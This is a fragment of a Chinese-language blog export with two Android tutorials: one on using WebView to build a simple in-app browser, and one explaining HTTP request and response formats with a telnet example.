    <content><![CDATA[<p>　　Android 提供了内置的浏览器，该浏览器使用了开源的 WebKit 引擎，要使用内置的浏览器就需要通过 WebView 来实现。Android WebView 在 Android 平台上是一个特殊的 View， 它能用来显示网页，这个类可以被用来在你的 App 中仅仅显示一张在线的网页，还可以用来开发浏览器。本文详细介绍了 WebView 的相关方法以及配置操作，最后通过一个简易的浏览器对 WebView 进行应用演示。</p>
<a id="more"></a>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>loadUrl(String url)</td>
<td>用于加载指定url对应得网页</td>
</tr>
<tr>
<td>goBack()</td>
<td>执行后退操作，相当于浏览器的回退按钮功能</td>
</tr>
<tr>
<td>goForward()</td>
<td>执行前进操作，相当于浏览器的前进按钮功能</td>
</tr>
<tr>
<td>stopLoading()</td>
<td>用于停止加载当前页面</td>
</tr>
<tr>
<td>reload()</td>
<td>用于刷新当前页面</td>
</tr>
</tbody>
</table>
<h5 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h5><p>　　访问百度首页：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView = (WebView) findViewById(R.id.webView1);</div><div class="line">mWebView.loadUrl(<span class="string">"http://www.baidu.com/"</span>);</div></pre></td></tr></table></figure>
<p>　　这个时候发现一个问题，启动应用后，自动的打开了系统内置的浏览器，解决这个问题需要为 webview 设置 WebViewClient，并重写重写 WebViewClient 的 shouldOverrideUrlLoading 方法返回 true，这样新的连接就会在当前 WebView 中打开。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.setWebViewClient(<span class="keyword">new</span> WebViewClient()&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span></span>&#123;</div><div class="line">        view.loadUrl(url);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h4 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h4><h5 id="WebSettings常用方法"><a href="#WebSettings常用方法" class="headerlink" title="WebSettings常用方法"></a>WebSettings常用方法</h5><p>　　获取设置 WebView 的 WebSettings 对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings()  <span class="comment">//得到WebSettings对象</span></div></pre></td></tr></table></figure>
<ol>
<li>设置支持自动加载图片</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings().setLoadsImagesAutomatically(<span class="keyword">true</span>);</div></pre></td></tr></table></figure>
<ol>
<li>设置支持放大和缩小的功能</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings().setSupportZoom(<span class="keyword">true</span>); </div><div class="line">mWebView..getSettings().setBuiltInZoomControls(<span class="keyword">true</span>)</div></pre></td></tr></table></figure>
<ol>
<li>设置支持多窗口</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings().supportMultipleWindows();</div></pre></td></tr></table></figure>
<ol>
<li>设置支持JavaScript</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</div></pre></td></tr></table></figure>
<ol>
<li>设置将图片调整到适合webview的大小 </li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings().setUseWideViewPort(<span class="keyword">false</span>);</div></pre></td></tr></table></figure>
<ol>
<li>设置支持插件 </li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.getSettings().setPluginsEnabled(<span class="keyword">true</span>);</div></pre></td></tr></table></figure>
<h5 id="WebViewClient常用方法"><a href="#WebViewClient常用方法" class="headerlink" title="WebViewClient常用方法"></a>WebViewClient常用方法</h5><p>　　设置将接收各种通知和请求的WebViewClient。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.setWebViewClient(<span class="keyword">new</span> WebViewClient()&#123;</div><div class="line">    <span class="comment">//可在此重写下列方法，以实现相应需求</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<ol>
<li>开始载入页面时调用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onPageStarted(WebView view, String url, Bitmap favicon)</div></pre></td></tr></table></figure>
<ol>
<li>在页面加载结束时调用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onPageFinished(WebView view, String url)</div></pre></td></tr></table></figure>
<ol>
<li>在加载页面资源时调用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onLoadResource(WebView view, String url)</div></pre></td></tr></table></figure>
<ol>
<li>报告错误信息</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onReceivedError(WebView view, <span class="keyword">int</span> errorCode, String description, String failingUrl)</div></pre></td></tr></table></figure>
<ol>
<li>重写此方法才能够处理在浏览器中的按键事件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">shouldOverrideKeyEvent(WebView view, KeyEvent event)</div></pre></td></tr></table></figure>
<ol>
<li>控制新的连接在当前WebView中打开</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">shouldOverrideUrlLoading(WebView view, String url)</div></pre></td></tr></table></figure>
<h5 id="WebChromeClient常用方法"><a href="#WebChromeClient常用方法" class="headerlink" title="WebChromeClient常用方法"></a>WebChromeClient常用方法</h5><p>　　设置chrome处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.setWebChromeClient(<span class="keyword">new</span> WebChromeClient() &#123;</div><div class="line">    <span class="comment">//可在此重写下列方法，以实现相应需求</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<ol>
<li>网页加载进度改变时调用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onProgressChanged(WebView view, <span class="keyword">int</span> newProgress)</div></pre></td></tr></table></figure>
<ol>
<li>网页加载完毕时获取网站标题</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onReceivedTitle(WebView view, String title)</div></pre></td></tr></table></figure>
<ol>
<li>创建WebView时</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onCreateWindow(WebView view, <span class="keyword">boolean</span> isDialog,<span class="keyword">boolean</span> isUserGesture, Message resultMsg)</div></pre></td></tr></table></figure>
<ol>
<li>关闭WebView时</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onCloseWindow(WebView window)</div></pre></td></tr></table></figure>
<ol>
<li>网页加载完毕时获取网站图标</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onReceivedIcon(WebView view, Bitmap icon)</div></pre></td></tr></table></figure>
<ol>
<li>WebView获得焦点时</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">onRequestFocus(WebView view)</div></pre></td></tr></table></figure>
<h5 id="浏览器开发小技巧"><a href="#浏览器开发小技巧" class="headerlink" title="浏览器开发小技巧"></a>浏览器开发小技巧</h5><ol>
<li>设置 android WebView 不显示滚动条</li>
</ol>
<p>　　可以直接在 layout 中添加如下属性设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">android:scrollbars=<span class="string">"none"</span></div></pre></td></tr></table></figure>
<ol>
<li>一些清除方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mWebView.clearHistory();    <span class="comment">//清除当前webview访问的历史记录</span></div><div class="line">mWebView.clearFormData();   <span class="comment">//清除自动完成填充的表单数据</span></div><div class="line">mWebView.clearCache();   <span class="comment">//清除网页访问留下的缓存</span></div><div class="line">mWebView.clearMatches();      <span class="comment">//清除网页查找的高亮匹配字符</span></div></pre></td></tr></table></figure>
<h4 id="自制简易浏览器"><a href="#自制简易浏览器" class="headerlink" title="自制简易浏览器"></a>自制简易浏览器</h4><p>　　带前进、后退、主页、刷新按钮，网页加载进度条，网址输入框的简单浏览器。实现效果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/26-1.jpg" alt="26-1"></p>
<h5 id="添加网络访问权限"><a href="#添加网络访问权限" class="headerlink" title="添加网络访问权限"></a>添加网络访问权限</h5><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></div></pre></td></tr></table></figure>
<h5 id="MainActivity-java"><a href="#MainActivity-java" class="headerlink" title="MainActivity.java"></a>MainActivity.java</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> WebView mWebView;</div><div class="line">    <span class="keyword">private</span> ImageButton mBack, mHome, mNext, mRefresh;</div><div class="line">    <span class="keyword">private</span> EditText mEditText;</div><div class="line">    <span class="keyword">private</span> ProgressBar mProgressBar;</div><div class="line">    <span class="keyword">private</span> String homeUrl = <span class="string">"www.baidu.com"</span>;</div><div class="line">    </div><div class="line">    <span class="meta">@SuppressLint</span>(<span class="string">"SetJavaScriptEnabled"</span>)</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        requestWindowFeature(Window.FEATURE_NO_TITLE);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        </div><div class="line">        mWebView = (WebView) findViewById(R.id.wb_test_web);</div><div class="line">        mBack = (ImageButton) findViewById(R.id.ib_back);   <span class="comment">//返回按钮</span></div><div class="line">        mHome = (ImageButton) findViewById(R.id.ib_home);   <span class="comment">//主页按钮</span></div><div class="line">        mNext = (ImageButton) findViewById(R.id.ib_next);   <span class="comment">//前进按钮</span></div><div class="line">        mRefresh = (ImageButton) findViewById(R.id.ib_refresh);     <span class="comment">//刷新按钮</span></div><div class="line">        mEditText = (EditText) findViewById(R.id.et_url);   <span class="comment">//网址输入框</span></div><div class="line">        mProgressBar = (ProgressBar) findViewById(R.id.pb_load);    <span class="comment">//网页加载进度条</span></div><div class="line">        </div><div class="line">        <span class="comment">/*设置监听事件*/</span></div><div class="line">        mBack.setOnClickListener(<span class="keyword">this</span>);</div><div class="line">        mHome.setOnClickListener(<span class="keyword">this</span>);</div><div class="line">        mNext.setOnClickListener(<span class="keyword">this</span>);</div><div class="line">        mRefresh.setOnClickListener(<span class="keyword">this</span>);</div><div class="line">        mEditText.setOnClickListener(<span class="keyword">this</span>);</div><div class="line">        </div><div class="line">        <span class="comment">/*WebView的基本设置*/</span></div><div class="line">        mWebView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</div><div class="line">        mWebView.getSettings().setSupportZoom(<span class="keyword">true</span>);</div><div class="line">        mWebView.getSettings().setBuiltInZoomControls(<span class="keyword">true</span>);</div><div class="line">        mWebView.setInitialScale(<span class="number">25</span>);</div><div class="line">        mWebView.getSettings().setUseWideViewPort(<span class="keyword">true</span>);</div><div class="line">        mWebView.setWebViewClient(<span class="keyword">new</span> WebViewClient());</div><div class="line">        </div><div class="line">        mWebView.setWebChromeClient(<span class="keyword">new</span> WebChromeClient() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(WebView view, <span class="keyword">int</span> newProgress)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                mProgressBar.setProgress(newProgress);  <span class="comment">//设置进度</span></div><div class="line">                System.out.println(newProgress);</div><div class="line">                <span class="keyword">if</span> (newProgress == <span class="number">100</span>) &#123;</div><div class="line">                    mProgressBar.setVisibility(View.GONE);  <span class="comment">//加载完后设置进度条不可见</span></div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    mProgressBar.setVisibility(View.VISIBLE);   <span class="comment">//设置进度条可见</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">super</span>.onProgressChanged(view, newProgress);</div><div class="line">            &#125;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceivedTitle</span><span class="params">(WebView view, String title)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                mEditText.setText(title);   <span class="comment">//网站加载完后，</span></div><div class="line">                <span class="keyword">super</span>.onReceivedTitle(view, title);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        </div><div class="line">        <span class="comment">/*加载主页*/</span></div><div class="line">        loadWeb(homeUrl);</div><div class="line">        </div><div class="line">        mEditText.setOnKeyListener(<span class="keyword">new</span> OnKeyListener() &#123;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onKey</span><span class="params">(View v, <span class="keyword">int</span> keyCode, KeyEvent event)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String url = mEditText.getText().toString();</div><div class="line">                <span class="keyword">if</span> (keyCode == KeyEvent.KEYCODE_ENTER) &#123;</div><div class="line">                    <span class="keyword">if</span> (!url.equals(<span class="string">""</span>)) &#123;</div><div class="line">                        loadWeb(url);</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">                    &#125;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"请输入要访问的网址"</span>,</div><div class="line">                        Toast.LENGTH_SHORT).show();</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadWeb</span><span class="params">(String url)</span> </span>&#123;</div><div class="line">            url = <span class="string">"http://"</span> + url;      <span class="comment">//补全url</span></div><div class="line">            mWebView.loadUrl(url);      <span class="comment">//加载页面</span></div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            <span class="keyword">switch</span> (v.getId()) &#123;</div><div class="line">            <span class="keyword">case</span> R.id.ib_back:</div><div class="line">                mWebView.goBack();      <span class="comment">//返回上一个页面</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> R.id.ib_home:</div><div class="line">                loadWeb(homeUrl);       <span class="comment">//回到主页</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> R.id.ib_next:</div><div class="line">                mWebView.goForward();   <span class="comment">//前进到下一个页面</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> R.id.ib_refresh:</div><div class="line">                mWebView.reload();      <span class="comment">//重新加载</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> R.id.et_url:</div><div class="line">                mEditText.setText(<span class="string">""</span>);  <span class="comment">//输入网站</span></div><div class="line">                mEditText.setHint(<span class="string">"请输入网址"</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Webview</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 网络编程：HTTP 协议</title>
    <url>/2016/08/22/Android%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>　　HTTP 协议是一个基于请求与响应模式的、无状态的、应用层的协议，常基于 TCP 的连接方式，HTTP1.1 版本中给出一种持续连接的机制，绝大多数的 Web 开发，都是构建在 HTTP 协议之上的 Web 应用。在之前的博客中多次使用 HTTP 网络请求，了解 HTTP 协议的详细工作过程以及报文格式，对于深入理解 Android 网络编程具有重要的意义。此篇博文通过搜集网络上优秀的博客文章，对 HTTP 协议的内容进行了较为详细的总结。</p>
<a id="more"></a>
<p>　　HTTP 协议（HyperText Transfer Protocol，超文本传输协议）是用于从 WWW 服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。</p>
<h4 id="HTTP工作流程"><a href="#HTTP工作流程" class="headerlink" title="HTTP工作流程"></a>HTTP工作流程</h4><p>　　HTTP协议永远都是客户端发起请求，服务器回送响应。见下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/22-1.jpg" alt="22-1"></p>
<p>　　这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。HTTP协议是一个无状态的协议，同一个客户端的这次请求和上次请求是没有对应关系。</p>
<p>　　一次HTTP操作称为一个事务，其工作过程可分为四步：</p>
<ol>
<li><p>首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作开始。</p>
</li>
<li><p>建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。</p>
</li>
<li><p>服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。</p>
</li>
<li><p>客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p>
</li>
</ol>
<p>　　如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端，有显示屏输出。对于用户来说，这些过程是由HTTP自己完成的，用户只要用鼠标点击，等待信息显示就可以了。</p>
<h4 id="HTTP-URL的格式"><a href="#HTTP-URL的格式" class="headerlink" title="HTTP URL的格式"></a>HTTP URL的格式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host[&quot;:&quot;port][abs_path]</div></pre></td></tr></table></figure>
<ul>
<li><p>http 表示通过 HTTP 协议来定位网络资源</p>
</li>
<li><p>host 表示合法的 Internet 主机域名或者 ip 地址</p>
</li>
<li><p>port 指定一个端口号，为空则使用默认端口 80</p>
</li>
<li><p>abs_path 指请求资源的 URL</p>
</li>
</ul>
<h4 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h4><p>　　HTTP 请求由四部分组成，分别是：请求行、请求报头、空行、请求数据。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/22-2.jpg" alt="22-2"></p>
<h5 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h5><p><strong>请求行格式：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">方法 请求的URL 版本 回车换行</div></pre></td></tr></table></figure>
<p><strong>HTTP请求方法：</strong></p>
<p>　　HTTP请求方法有8种，分别是GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE、CONNECT 。</p>
<ul>
<li><p>GET：GET的本质就是发送一个请求来取得服务器上的某一资源。资源通过一组HTTP头和呈现数据（如HTML文本，或者图片或者视频等）返回给客户端。</p>
</li>
<li><p>POST：向服务器提交数据。这个方法用途广泛，几乎目前所有的提交操作都是靠这个完成。</p>
</li>
<li><p>PUT：本质上来讲， PUT和POST极为相似，都是向服务器发送数据，但它们之间有一个重要区别，PUT通常指定了资源的存放位置，而POST则没有，POST的数据存放位置由服务器自己决定。</p>
</li>
<li><p>DELETE：请求服务器删除请求的URI所标识的资源。</p>
</li>
<li><p>HEAD：HEAD和GET本质是一样的，区别在于HEAD不含有呈现数据，而仅仅是HTTP头信息。有的人可能觉得这个方法没什么用，其实不是这样的。想象一个业务情景：欲判断某个资源是否存在，我们通常使用GET，但这里用HEAD则意义更加明确。</p>
</li>
<li><p>OPTIONS：它可以用来获取服务器支持的HTTP请求方法，还可以用来用来检查服务器的性能。它对于服务端和用户端一定是安全的。</p>
</li>
<li><p>TRACE 请求服务器回送收到的请求信息，主要用于测试或诊断。</p>
</li>
<li><p>CONNECT 保留将来使用。</p>
</li>
</ul>
<h5 id="请求报头"><a href="#请求报头" class="headerlink" title="请求报头"></a>请求报头</h5><p>　　在请求行之后会有 0 个或者多个请求报头，每个请求报头都由关键字/值对组成，每行一对，关键字和值用英文冒号 <code>:</code> 分隔。请求报头通知服务器关于客户端求求的信息，典型的请求头有：</p>
<ul>
<li><p>Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机</p>
</li>
<li><p>User-Agent：发送请求的浏览器类型、操作系统等信息</p>
</li>
<li><p>Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息</p>
</li>
<li><p>Accept-Encoding：客户端可识别的数据编码</p>
</li>
<li><p>Accept-Language：表示浏览器所支持的语言类型</p>
</li>
<li><p>Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如设置为Keep-Alive则表示保持连接。</p>
</li>
<li><p>Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。</p>
</li>
</ul>
<h5 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h5><p>　　最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头。</p>
<h5 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h5><p>　　请求数据不在 GET 方法中使用，而是在 POST 方法中使用。POST 方法适用于需要客户填写表单的场合，与请求数据相关的最常用的请求头是 Content-Type 和 Content-Length。</p>
<h4 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h4><p>　　HTTP响应也由四部分组成，分别是：状态行、响应报头、空行、响应数据</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/22-3.png" alt="22-3"></p>
<h5 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h5><p><strong>状态行格式：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">版本 状态码 原因短语 回车换行</div></pre></td></tr></table></figure>
<p><strong>HTTP协议响应状态码：</strong></p>
<p>　　HTTP 协议响应状态码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值：</p>
<ul>
<li><p>1xx：指示信息–表示请求已接收，继续处理</p>
</li>
<li><p>2xx：成功–表示请求已被成功接收、理解、接受</p>
</li>
<li><p>3xx：重定向–要完成请求必须进行更进一步的操作</p>
</li>
<li><p>4xx：客户端错误–请求有语法错误或请求无法实现</p>
</li>
<li><p>5xx：服务器端错误–服务器未能实现合法的请求</p>
</li>
</ul>
<p><strong>常见状态代码、状态描述、说明</strong>：</p>
<ul>
<li><p>200 OK  客户端请求成功。</p>
</li>
<li><p>304 NOT MODIFIED 未修改；一般浏览器会缓存一些数据，当下次请求时将发送Etag与Last_Modified信息给服务器确定是否次文件在服务器修改过，若果是将重新加载。</p>
</li>
<li><p>400 Bad Request 客户端请求有语法错误，不能被服务器所理解。</p>
</li>
<li><p>401 Unauthorized 请求未经授权，这个状态代码必须和 WWW-Authenticate 报头域一起使用。</p>
</li>
<li><p>403 Forbidden 服务器收到请求，但是拒绝提供服务。</p>
</li>
<li><p>404 Not Found 请求资源不存在，eg：输入了错误的URL。</p>
</li>
<li><p>500 Internal Server Error 服务器发生不可预期的错误。</p>
</li>
<li><p>503 Server Unavailable 服务器当前不能处理客户端的请求，一段时间后可能恢复正常。</p>
</li>
</ul>
<h5 id="响应报头"><a href="#响应报头" class="headerlink" title="响应报头"></a>响应报头</h5><p>　　用于服务器传递自身信息的响应，常见的响应报头：</p>
<ul>
<li>Location：用于重定向接受者到一个新的位置，常用在更换域名的时候。</li>
<li>Server：包含可服务器用来处理请求的系统信息，与User-Agent请求报头是相对应的。</li>
</ul>
<h5 id="响应数据"><a href="#响应数据" class="headerlink" title="响应数据"></a>响应数据</h5><p>　　服务器根据发送的请求返回的数据。</p>
<h4 id="HTTP报头"><a href="#HTTP报头" class="headerlink" title="HTTP报头"></a>HTTP报头</h4><p>　　HTTP报头分为通用报头，请求报头，响应报头和实体报头。 </p>
<ul>
<li><p>请求方的http报头结构：通用报头|请求报头|实体报头 。</p>
</li>
<li><p>响应方的http报头结构：通用报头|响应报头|实体报头。</p>
</li>
</ul>
<p>　　请求报头与响应报头在前文已经详细描述，下文主要讲解通用报头和实体报头。</p>
<h5 id="通用报头"><a href="#通用报头" class="headerlink" title="通用报头"></a>通用报头</h5><p>　　既可以出现在请求报头，也可以出现在响应报头中。</p>
<ul>
<li><p>Date：表示消息产生的日期和时间。</p>
</li>
<li><p>Connection：允许发送指定连接的选项，例如指定连接是连续的，或者指定“close”选项，通知服务器，在响应完成后，关闭连接。</p>
</li>
<li><p>Cache-Control：用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机制）。</p>
</li>
</ul>
<h5 id="实体报头"><a href="#实体报头" class="headerlink" title="实体报头"></a>实体报头</h5><p>　　实体报头用来定于被传送资源的信息，既可以用于请求也可用于响应。请求和响应消息都可以传送一个实体，常见的实体报头为：</p>
<ul>
<li><p>Content-Type：发送给接收者的实体正文的媒体类型。</p>
</li>
<li><p>Content-Lenght：实体正文的长度。</p>
</li>
<li><p>Content-Language：描述资源所用的自然语言，没有设置则该选项则认为实体内容将提供给所有的语言阅读。</p>
</li>
<li><p>Content-Encoding：实体报头被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。</p>
</li>
<li><p>Last-Modified：实体报头用于指示资源的最后修改日期和时间。</p>
</li>
<li><p>Expires：实体报头给出响应过期的日期和时间。</p>
</li>
</ul>
<h4 id="请求示例"><a href="#请求示例" class="headerlink" title="请求示例"></a>请求示例</h4><p>　　Windows 下使用 cmd 的 telnet 命令模拟 HTTP 请求</p>
<h5 id="打开命令提示符输入以下内容，建立连接"><a href="#打开命令提示符输入以下内容，建立连接" class="headerlink" title="打开命令提示符输入以下内容，建立连接"></a>打开命令提示符输入以下内容，建立连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">telnet blog.line-coding.tech 80</div></pre></td></tr></table></figure>
<p>　　HTTP 默认使用 80 端口，HTTPS 默认使用 443。此示例是对我的博客的一个404页面发送一个GET请求，所以请求地址为 blog.line-coding.tech。</p>
<p>　　输入上面的命令回车之后就会进入命令界面，可以输入请求信息，也可以通过使用快捷键 “Ctrl+](右中括号)” 来打开本地回显功能查看自己输入的内容，在本地回显界面再按下回车就可以进入命令界面编辑请求信息。</p>
<h5 id="输入请求头信息"><a href="#输入请求头信息" class="headerlink" title="输入请求头信息"></a>输入请求头信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">HOST:blog.line-coding.tech</div><div class="line">User-Agent:Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36</div><div class="line">Accept:*/*</div><div class="line">Accept-Encoding:gzip, deflate, sdch</div><div class="line">Accept-Language:zh-CN</div><div class="line">Connection:keep-alive</div></pre></td></tr></table></figure>
<h5 id="按两下回车键得到响应信息"><a href="#按两下回车键得到响应信息" class="headerlink" title="按两下回车键得到响应信息"></a>按两下回车键得到响应信息</h5><p>　　第一个回车代表请求头结束的空行，第二个回车代表请求数据为空并发送请求。结果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/22-4.png" alt="22-4"></p>
<p>　　红色箭头指示为我们输入的请求头，蓝色箭头指示的为响应报文的内容，下面还有一些内容就是响应数据。</p>
<p>　　参考文章：</p>
<p><a href="http://blog.csdn.net/chenhanzhun/article/details/43149557" target="_blank" rel="external">[1]《网络协议》HTTP 协议</a></p>
<p><a href="http://www.blogjava.net/zjusuyong/articles/304788.html" target="_blank" rel="external">[2] http协议学习系列</a></p>
<p><a href="http://blog.csdn.net/hsd2012/article/details/51075811" target="_blank" rel="external">[3]通过win7中cmd命令提示符telnet模拟http请求</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>网络</tag>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(六)</title>
    <url>/2016/08/21/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%85%AD/</url>
